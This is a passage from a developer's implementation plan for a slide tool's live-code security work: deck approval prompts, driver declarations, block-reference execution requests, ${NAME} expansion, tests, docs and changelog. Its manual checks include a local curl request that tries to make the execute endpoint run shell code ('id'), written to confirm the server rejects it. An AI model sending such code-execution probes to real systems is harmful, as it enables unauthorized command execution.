		render(<LiveCodeBlock codeBlock={sqlBlock()} slideNumber={4} />);
		fireEvent.click(screen.getByRole('button', { name: 'Run code' }));
		expect(await screen.findByText('Not approved: this deck may not run code with this driver.')).toBeInTheDocument();
	});
```

In `frontend/src/lib/components/Slide.test.tsx`, add `fireEvent` and `screen` to the existing `@testing-library/react` import, add `import { useConnectionStore } from '../stores/websocket';`, and add this test:

```tsx
	it('runs a live code block by its slide number and block number', async () => {
		useConnectionStore.setState({ connected: true, staticMode: false });
		const fetchMock = vi.fn(
			async () => ({ ok: true, json: async () => ({ success: true, output: 'ok' }) }) as unknown as Response
		);
		vi.stubGlobal('fetch', fetchMock);
		const slide = makeSlide({
			index: 3,
			slots: { default: '<pre><code class="language-sql" data-code-block-index="0">SELECT 1;</code></pre>' },
			codeBlocks: [{ language: 'sql', code: 'SELECT 1;', driver: 'sqlite', block: 1 }]
		});

		try {
			render(<Slide slide={slide} active printMode={false} fragmentIndex={-1} step={0} total={5} />);
			fireEvent.click(await screen.findByRole('button', { name: 'Run code' }));
			await waitFor(() => {
				expect(fetchMock).toHaveBeenCalledWith(
					'/api/execute',
					expect.objectContaining({ body: JSON.stringify({ slide: 4, block: 1 }) })
				);
			});
		} finally {
			vi.unstubAllGlobals();
			useConnectionStore.setState({ connected: false, staticMode: false });
		}
	});
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `cd frontend && npx vitest run src/lib/components/LiveCodeBlock.test.tsx src/lib/components/Slide.test.tsx`
Expected: FAIL. TypeScript reports `slideNumber` is not a prop, and the body is still `{driver, code, connection}`.

- [ ] **Step 3: Change the types (`frontend/src/lib/types.ts`)**

Add to `CodeBlock`, after `highlightLines`:

```ts
	/** The block's number among the slide's live code blocks, counted from 1. Absent for a block without a driver. */
	block?: number;
	/** Why this live block cannot run, such as a driver the deck does not declare. */
	problem?: string;
```

Above `Presentation`, add:

```ts
/**
 * Which drivers this run of tap dev or tap present lets run.
 * Matches Go's liveCodeStatus.
 */
export interface LiveCodeStatus {
	/** The declared drivers this run allows. A block whose driver is missing shows "Not approved". */
	drivers: string[];
}
```

Add to `Presentation`:

```ts
	/** Present when the server can run live code; absent for a static build or an export. */
	liveCode?: LiveCodeStatus;
```

Replace `ExecuteRequest` with:

```ts
/**
 * Request to run one live code block of the loaded deck.
 * Both numbers count from 1; tap runs the code the deck holds there.
 */
export interface ExecuteRequest {
	slide: number;
	block: number;
}
```

- [ ] **Step 4: Change `frontend/src/lib/components/LiveCodeBlock.tsx`**

1. In the file comment, change "and renders the result returned by `POST /api/execute`." to "and renders the result returned by `POST /api/execute`, which it sends only the slide and block number, never the code."
2. Add `import { usePresentationStore } from '../stores/presentation';`.
3. Add to `LiveCodeBlockProps`:

```ts
	/** The number of the slide the block is on, counted from 1. */
	slideNumber: number;
```

4. Change the signature to `export function LiveCodeBlock({ codeBlock, slideNumber }: LiveCodeBlockProps) {`, and replace the three lines from `const hasDriver = ...` to `const showStaticPlaceholder = ...` with:

```ts
	const liveCode = usePresentationStore((state) => state.presentation?.liveCode);

	const hasDriver = !!codeBlock.driver;
	const problem = hasDriver && liveExecutionAvailable ? codeBlock.problem : undefined;
	// A server that sends no live code status (tap export's) keeps the Run
	// button; /api/execute still refuses anything it may not run.
	const approved = !liveCode || (!!codeBlock.driver && liveCode.drivers.includes(codeBlock.driver));
	const runnable = hasDriver && liveExecutionAvailable && !problem && codeBlock.block !== undefined;
	const canExecute = runnable && approved;
	const notApproved = runnable && !approved;
	const showStaticPlaceholder = hasDriver && !liveExecutionAvailable;
```

5. In `executeCode`, replace the `request` object with:

```ts
		const request: ExecuteRequest = { slide: slideNumber, block: codeBlock.block! };
```

and change its dependency list to `[canExecute, isExecuting, codeBlock, slideNumber]`.

6. After the `{canExecute && ( ... )}` block inside `code-container`, add:

```tsx
				{notApproved && (
					<div className="code-actions">
						<button
							className="run-button not-approved"
							disabled
							title="Approve this deck when tap dev or tap present asks at startup, or pass --allow-code"
						>
							Not approved
						</button>
					</div>
				)}
```

7. After the closing `</div>` of `code-container`, before `{result && (`, add:

```tsx
			{problem && (
				<pre className="live-code-problem" role="note">
					{problem}
				</pre>
			)}
```

- [ ] **Step 5: Pass the slide number (`frontend/src/lib/components/Slide.tsx`)**

Change the live portal line to:

```tsx
						createPortal(
							<LiveCodeBlock codeBlock={portal.codeBlock} slideNumber={slide.index + 1} />,
							portal.container,
							portal.key
						)
```

- [ ] **Step 6: Style the problem (`frontend/src/lib/styles/rich-blocks.css`)**

After the `.live-code-block.static-mode .code-container pre` rule, add:

```css
.live-code-block .live-code-problem {
	margin: 0.5em 0 0;
	padding: 0.75em 1em;
	font-size: 0.8rem;
	line-height: 1.5;
	white-space: pre-wrap;
	color: var(--color-text);
	background-color: rgba(0, 0, 0, 0.25);
	border-left: 3px solid var(--color-accent);
	border-radius: 4px;
}

.live-code-block .run-button.not-approved {
	cursor: not-allowed;
}
```

- [ ] **Step 7: Run the tests to verify they pass**

Run: `cd frontend && npx vitest run src/lib/components/LiveCodeBlock.test.tsx src/lib/components/Slide.test.tsx`
Expected: PASS.

Run: `cd frontend && npm test && npm run lint && npx tsc -p tsconfig.app.json --noEmit`
Expected: PASS with no lint or type errors. (`make typecheck` runs the same check if it exists.)

Run: `make build`
Expected: the frontend builds into `embedded/dist` and the Go binary builds.

- [ ] **Step 8: Check it in a browser**

Run: `XDG_CONFIG_HOME=$(mktemp -d) ./bin/tap dev examples/sql-demo.md --headless` (use the path `make build` prints), open the audience URL, and go to a slide with a SQL block.
Expected: the block shows a disabled "Not approved" button. Stop it and run again with `--allow-code`: Run shows the result table. Open `/presenter` and run a block there too. Then add a `bash {driver: shell}` block to a copy of the deck without declaring `shell`: that block shows the undeclared driver message and the terminal prints it with the file and line.

- [ ] **Step 9: Commit**

```bash
git add frontend/src
git commit -m "feat(frontend): run live code by slide and block, and show when it may not run"
```

---

### Task 12: Example decks declare their drivers

**Files:**
- Modify: `examples/conference-talk.md`
- Modify: `docs/examples/tech-talk.md`, `docs/examples/workshop.md`, `docs/examples/demo-day.md`
- Create: `internal/cli/example_decks_test.go`

**Interfaces:**
- Consumes: `TransformedCodeBlock.Problem` (Task 3)

- [ ] **Step 1: Write the failing test**

`internal/cli/example_decks_test.go`:

```go
package cli

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/MiniCodeMonkey/tap/internal/config"
	"github.com/MiniCodeMonkey/tap/internal/parser"
	"github.com/MiniCodeMonkey/tap/internal/transformer"
)

// TestExampleDecksDeclareTheirDrivers keeps every shipped deck runnable:
// a live code block whose driver the deck does not declare never runs.
func TestExampleDecksDeclareTheirDrivers(t *testing.T) {
	var decks []string
	for _, pattern := range []string{"../../examples/*.md", "../../docs/examples/*.md", "../../testdata/*.md"} {
		matches, err := filepath.Glob(pattern)
		if err != nil {
			t.Fatal(err)
		}
		decks = append(decks, matches...)
	}
	if len(decks) == 0 {
		t.Fatal("no example decks found")
	}

	for _, deck := range decks {
		t.Run(filepath.Base(deck), func(t *testing.T) {
			content, err := os.ReadFile(deck)
			if err != nil {
				t.Fatal(err)
			}
			cfg, err := config.Load(deck)
			if err != nil {
				t.Skipf("not a deck: %v", err)
			}
			parsed, err := parser.New().Parse(content)
			if err != nil {
				t.Skipf("not a deck: %v", err)
			}
			for _, slide := range transformer.New(cfg).Transform(parsed).Slides {
				for _, block := range slide.CodeBlocks {
					if block.Problem != "" {
						t.Errorf("%s slide %d: %s", deck, slide.Index+1, block.Problem)
					}
				}
			}
		})
	}
}
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `go test ./internal/cli -run TestExampleDecksDeclareTheirDrivers -short -v`
Expected: FAIL for `conference-talk.md` (sqlite), `tech-talk.md` (sqlite), `workshop.md` (sqlite) and `demo-day.md` (shell). If another deck fails, fix it the same way.

- [ ] **Step 3: Declare the drivers**

In `examples/conference-talk.md`, add after `transition: fade` in the frontmatter:

```yaml
drivers:
  sqlite:
    connections:
      incident:
        database: ":memory:"
```

In `docs/examples/tech-talk.md` and `docs/examples/workshop.md`, add after `title: ...`:

```yaml
drivers:
  sqlite: {}
```

In `docs/examples/demo-day.md`, add after `title: ...`:

```yaml
drivers:
  shell: {}
```

Check each deck's blocks with `grep -n "driver:" <file>` and declare every driver it names.

- [ ] **Step 4: Run the test to verify it passes**

Run: `go test ./internal/cli -run TestExampleDecksDeclareTheirDrivers -short -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add examples docs/examples internal/cli/example_decks_test.go
git commit -m "docs(examples): declare the drivers every example deck uses"
```

---

### Task 13: Docs, skill and changelog

**Files:**
- Modify: `docs/guide/live-code-execution.md`
- Modify: `docs/reference/drivers.md`, `docs/reference/frontmatter-options.md`, `docs/reference/cli-commands.md`
- Modify: `skills/tap/rules/live-code.md`, `skills/tap/rules/cli.md`, `skills/tap/rules/frontmatter.md`, `skills/tap/SKILL.md`
- Modify: `README.md`
- Modify: `CHANGELOG.md`, `docs/changelog.md`

Do not edit `docs/superpowers/**`, `SPEC.md`, `tasks/**`, or released changelog sections.

- [ ] **Step 1: List every mention**

Run:

```bash
grep -rnE '\$[A-Z_]{2,}|\{driver:|drivers:|/api/execute' \
  README.md docs/guide docs/reference docs/getting-started.md skills
```

Every hit is a place to check against steps 2 to 6.

- [ ] **Step 2: Environment variables use `${NAME}`**

In every file from step 1, change a bare `$NAME` in a driver setting to `${NAME}`, for example `password: $PGPASSWORD` to `password: ${PGPASSWORD}`. Leave shell code inside code blocks alone (`echo $HOME` in a bash block is shell, not a driver setting).

Replace the "Environment Variable Substitution" section of `docs/reference/drivers.md`, the "Environment Variables for Credentials" section of `docs/guide/live-code-execution.md`, the "Environment variables" note in `docs/reference/frontmatter-options.md`, and "Environment Variables" in `skills/tap/rules/live-code.md` with this text (adapted to each file's heading level):

````markdown
### Environment variables

String values in `drivers:` settings can read the environment with `${NAME}`:

```yaml
drivers:
  postgres:
    connections:
      demo:
        host: ${PGHOST}
        user: ${PGUSER}
        password: ${PGPASSWORD}
```

- tap expands `${NAME}` when a block runs, not when it loads the deck, so the value never reaches the slide page or a `tap build` folder.
- A `.env` file next to the deck is read too.
- A variable that is not set makes the block fail with a message that names it. It never becomes an empty string.
- `$${` writes a literal `${`. Any other `$` stays as it is, so `$PGPASSWORD` without braces is not expanded.
- Only driver settings expand. Other frontmatter keys, such as `title`, stay as written.
````

- [ ] **Step 3: Declaring drivers and approving a deck**

Add these sections to `docs/guide/live-code-execution.md`, after "Basic Syntax". Replace the "What tap runs" section that P1 added with the third one.

````markdown
## Declare the drivers a deck uses

Every driver a live code block uses must be a key under `drivers:` in the frontmatter. A driver with no settings is declared as `{}`:

```yaml
---
title: My Talk
drivers:
  shell: {}
  sqlite:
    connections:
      demo:
        database: ":memory:"
---
```

A block whose driver is not declared never runs. The block shows what to add, and `tap dev` prints the same message with the file and line:

```
warning: talk.md:24: This deck does not declare the shell driver. Add "shell: {}" under drivers in the frontmatter.
```

## Approving a deck

A deck with live code runs nothing until you approve it. The first time `tap dev` or `tap present` opens it in a terminal, tap asks before the TUI starts:

```
This deck can run code on this computer:
  /Users/me/talks/talk.md

  python     1 block on slide 7, runs: python3 -c
  shell      2 blocks on slides 3, 5

Allow this deck to run code? Type s to show the code. [y/N/s]
```

- `s` prints every block, then asks again. Return means no.
- A yes is saved in `~/.config/tap/settings.yaml` with the deck's path and its drivers. Editing the code never asks again.
- A no saves nothing. The deck still previews and presents, its Run buttons show "Not approved", and tap asks again next time.
- A new driver in the frontmatter asks again, and names only the new driver. A moved deck asks again, because approvals are keyed by path.
- `tap new` approves the deck it creates.
- Without a terminal, or with `--headless`, tap never asks. An unapproved deck's live code stays off. `--allow-code` turns it on for that run and saves nothing.
- `tap approval list` shows the approved decks, and `tap approval revoke <deck>` removes one.

## What tap runs

A Run button sends only the slide number and the block number, such as `{"slide": 4, "block": 1}`. tap runs the code the deck file holds at that position, with that block's driver and connection. `/api/execute` refuses a request that carries code (400), an unknown slide or block (404), a block whose driver the deck does not declare (422), and a driver this run has not approved (403). `tap build` and `tap export` never run code.
````

Add a short version to `skills/tap/rules/live-code.md` under "Basic Syntax":

````markdown
**Declare every driver.** A deck with live code lists each driver it uses under `drivers:` in the frontmatter, `shell: {}` for one with no settings. A block with an undeclared driver never runs. When you add a live code block, add its driver to `drivers:` in the same edit.

**Approval.** The person running the deck approves it once in the terminal. `tap new` approves the decks it creates. For a headless run in a script or test, pass `--allow-code`.
````

In `skills/tap/rules/frontmatter.md` and `docs/reference/frontmatter-options.md`, in the `drivers` entry, add: "Required for live code: every driver a block uses must be a key here. `shell: {}` declares a driver with no settings."

Update every frontmatter example in `docs/reference/drivers.md`, `docs/guide/live-code-execution.md`, `skills/tap/rules/live-code.md` and `README.md` that shows a live block, so its frontmatter declares that block's driver.

- [ ] **Step 4: The commands**

In `docs/reference/cli-commands.md` and `skills/tap/rules/cli.md`:

1. Add a row to the flag tables of `tap dev` and `tap present`: "`--allow-code` | Run the deck's live code for this run without an approval, and save none. For `--headless` and scripts."
2. Add a section after `theme show`:

````markdown
### tap approval list

Lists the decks allowed to run live code, with the drivers each may use and when it was approved.

```bash
tap approval list
tap approval list --json
```

`--json` prints `{"ok": true, "approvals": [{"deck": "/Users/me/talks/talk.md", "drivers": ["shell", "sqlite"], "approvedAt": "2026-09-22T19:32:00Z"}]}`.

### tap approval revoke <deck>

Removes a deck's approval. tap asks again the next time it opens the deck. `<deck>` is the file or its folder. A moved or deleted deck can be revoked by its old path. An unapproved deck is exit 1 with the code `not_approved`.

```bash
tap approval revoke talk.md
tap approval revoke talk.md --json   # {"ok": true, "deck": "/Users/me/talks/talk.md"}
```
````

In `skills/tap/SKILL.md`, in the "Live code execution" line, add: "Declare each driver under `drivers:` in the frontmatter (`shell: {}` for one with no settings); a deck runs code only after the person approves it, or with `--allow-code`."

- [ ] **Step 5: The changelog**

In `CHANGELOG.md` and `docs/changelog.md`, under `## [Unreleased]`, matching each file's style:

Under `### Added`:

```markdown
- **Approve a deck before it runs code** - A deck with live code runs nothing until you approve it. `tap dev` and `tap present` ask once in the terminal, before the TUI starts, and list the drivers, the command of any custom driver, and which slides have blocks. `s` shows the code. The answer is saved in `~/.config/tap/settings.yaml`, keyed by the deck's path and its drivers, so editing code never asks again, while a new driver or a moved deck does. A no saves nothing: the deck still presents, and its Run buttons show "Not approved". `tap new` approves the decks it creates.
- **`tap approval list` and `tap approval revoke <deck>`** - See and remove approvals. Both take `--json`.
- **`--allow-code`** on `tap dev` and `tap present` - Runs live code for that run without an approval, and saves none. Without a terminal, or with `--headless`, tap never asks, and an unapproved deck's live code stays off.
```

Under `### Changed`:

```markdown
- **A deck declares the drivers it uses** - Every driver a live code block uses must be a key under `drivers:` in the frontmatter, `shell: {}` for one with no settings. A block with an undeclared driver does not run, and shows the line to add. `tap dev` prints the same message with the file and line.
- **Environment variables in driver settings use `${NAME}`** - `${PGPASSWORD}` expands when the block runs. `$PGPASSWORD` without braces is no longer expanded, `$${` writes a literal `${`, and a variable that is not set fails the block with a message that names it instead of passing the text through.
```

Replace the `### Security` entry P1 added ("Only the deck's own code runs") with:

```markdown
- **Run buttons send a block reference, not code** - `/api/execute` accepts only `{"slide": n, "block": n}` and runs the code the deck file holds there. A request that carries code gets 400. Together with approvals, a page, a component or another client can run only the deck's own blocks, and only after you approved the deck.
- **Secrets in driver settings stay out of the page** - Environment variables used to be expanded when the deck loaded, so an expanded password went to the page in `/api/presentation` and into `tap build` output. They now expand only when a driver runs.
```

- [ ] **Step 6: Check the docs build**

Run: `cd docs && npm run build`
Expected: the build succeeds with no broken links. (Skip this if `docs/node_modules` is missing, and say so in the PR.)

Run the grep from step 1 again.
Expected: no bare `$NAME` left in a driver setting, and every live block example has its driver declared.

- [ ] **Step 7: Commit**

```bash
git add docs/guide docs/reference skills README.md CHANGELOG.md docs/changelog.md
git commit -m "docs: document driver declarations, approvals and \${NAME} expansion"
```

---

## Final check

- [ ] Run `go test ./...` (not `-short`, so the `tap dev` subprocess tests run).
- [ ] Run `go vet ./...` and `make lint`.
- [ ] Run `cd frontend && npm test && npm run lint`.
- [ ] Run `make build`, then by hand, each with `XDG_CONFIG_HOME=$(mktemp -d)`:
  - `tap dev examples/code-demo.md`: the prompt lists `python` with its command and `shell`. Answer no: Run buttons show "Not approved". Restart and answer yes: Run works. `tap approval list` shows the deck. `tap approval revoke examples/code-demo.md`, then `tap dev` asks again.
  - Add `ruby: {command: ruby, args: ["-e"]}` under `drivers:` and restart: tap asks "This deck now also wants to run ruby".
  - Copy the deck to another folder and run it: tap asks again.
  - `tap dev examples/code-demo.md --headless`: no prompt, "Live code is off" on the terminal, and `curl -s -X POST -H 'Content-Type: application/json' -H "Origin: http://localhost:3000" -d '{"slide":2,"block":1}' http://localhost:3000/api/execute` answers 403. With `--allow-code` it answers 200. `-d '{"driver":"shell","code":"id"}'` answers 400.
  - `tap present examples/sql-demo.md`: the recording consent question (on a first run) comes before the approval question, and both come before the TUI.
  - Put `password: ${TAP_UNSET_PASSWORD}` in a mysql connection and run a block: it fails with "TAP_UNSET_PASSWORD is not set". `curl -s http://localhost:3000/api/presentation | grep -c TAP_UNSET_PASSWORD` shows the literal `${...}`, never a value.
  - `tap new demo.md --yes` then `tap approval list`: the new deck is listed.
